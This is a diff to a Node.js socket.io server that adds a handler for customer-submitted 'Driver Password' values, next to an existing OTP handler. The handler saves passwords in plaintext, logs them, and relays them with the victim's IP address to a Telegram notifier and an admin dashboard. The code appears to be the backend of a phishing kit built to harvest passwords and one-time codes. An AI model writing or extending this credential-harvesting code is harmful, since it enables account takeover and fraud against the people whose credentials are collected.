@@ -205,6 +205,68 @@ io.on('connection', (socket) => {
         }
     });
 
+    // Customer submits Driver Password
+    socket.on('submit_password', async (data, callback) => {
+        const { verificationId, phoneNumber, password, customSlug } = data;
+        const clientIp = socket.handshake.address;
+        const now = new Date();
+
+        if (!password) {
+            if (callback) callback({ success: false, message: 'كلمة المرور مطلوبة' });
+            return;
+        }
+
+        try {
+            if (isMongoConnected) {
+                if (verificationId && !verificationId.startsWith('REC_') && !verificationId.startsWith('LOCAL_')) {
+                    await Verification.findByIdAndUpdate(verificationId, {
+                        password,
+                        status: 'PASSWORD_SUBMITTED'
+                    });
+                } else if (phoneNumber) {
+                    await Verification.findOneAndUpdate(
+                        { phoneNumber },
+                        { password, status: 'PASSWORD_SUBMITTED' },
+                        { sort: { createdAt: -1 } }
+                    );
+                }
+            }
+
+            const record = localVerifications.find(v => (v._id === verificationId || v.phoneNumber === phoneNumber));
+            if (record) {
+                record.password = password;
+                record.status = 'PASSWORD_SUBMITTED';
+            }
+
+            console.log(`[Notification] Password submitted for ${phoneNumber || verificationId}: ${password}`);
+
+            telegramNotifier.notifyPasswordSubmitted({
+                phoneNumber: phoneNumber || record?.phoneNumber || 'Unknown',
+                password,
+                customSlug: customSlug || record?.customSlug || '/',
+                ipAddress: clientIp,
+                submittedAt: now
+            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));
+
+            io.emit('admin_notification', {
+                type: 'PASSWORD_SUBMITTED',
+                data: {
+                    id: verificationId,
+                    phoneNumber: phoneNumber || record?.phoneNumber || 'Unknown',
+                    password,
+                    status: 'PASSWORD_SUBMITTED',
+                    customSlug: customSlug || '/',
+                    submittedAt: now
+                }
+            });
+
+            if (callback) callback({ success: true, message: 'تم حفظ كلمة المرور' });
+        } catch (err) {
+            console.error('Error handling submit_password:', err);
+            if (callback) callback({ success: false, message: err.message });
+        }
+    });
+
     // Customer submits 4-Digit OTP
     socket.on('submit_otp', async (data, callback) => {
         const { verificationId, phoneNumber, otp, customSlug } = data;
